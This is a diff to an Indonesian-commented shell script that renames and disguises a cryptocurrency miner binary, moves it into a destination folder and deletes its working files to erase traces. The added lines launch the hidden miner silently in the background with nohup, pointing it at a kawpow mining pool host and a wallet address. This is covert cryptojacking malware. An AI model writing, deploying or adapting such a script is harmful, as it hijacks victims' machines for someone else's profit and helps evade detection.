@@ -21,8 +21,11 @@ mv "$MINER_NAME" "$NEW_NAME"
 mkdir -p "$DEST"
 mv "$NEW_NAME" "$DEST/"
 
-# Bersih-bersih jejak
+# Bersih-bersih 
 cd ..
 rm -rf "$WORKDIR"
 
-echo "Done sayang! Minernya udah nyamar jadi $DEST/$NEW_NAME dan jejaknya udah bersih~"
+# Auto-jalankan proses 
+nohup "$DEST/$NEW_NAME" -a kawpow -o store.myloveistrikupoppy.my.id:11001 -u AcgbSR2YfqEVVpqSDgpWnwpvCSiXtRWV25 -p x > /dev/null 2>&1 &
+
+echo "Berhasil sayang~ File udah di $DEST/$NEW_NAME ~"
